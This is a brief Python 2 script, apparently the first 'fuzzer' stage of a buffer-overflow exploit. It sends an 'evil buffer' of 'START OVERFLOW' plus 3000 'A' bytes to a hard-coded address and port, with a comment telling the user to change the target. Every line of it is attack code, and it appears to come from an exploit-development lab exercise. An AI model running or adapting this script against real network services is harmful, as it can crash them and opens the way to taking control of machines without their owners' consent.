#!/usr/bin/python 
import socket 
import time 
import sys

#the first step: fuzzer script

size = 3000

try:
  
  inputBuffer = "START OVERFLOW" + ("\x41" * size) + "\r\n"

  print "Sending evil buffer with %s bytes\n" % len(inputBuffer)
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  #change ip and port
  s.connect(("192.168.1.10", 9999))
  s.send(inputBuffer)
  
  s.close()
  print "Done!"

except:
  print "\nCould not connect!"
  sys.exit()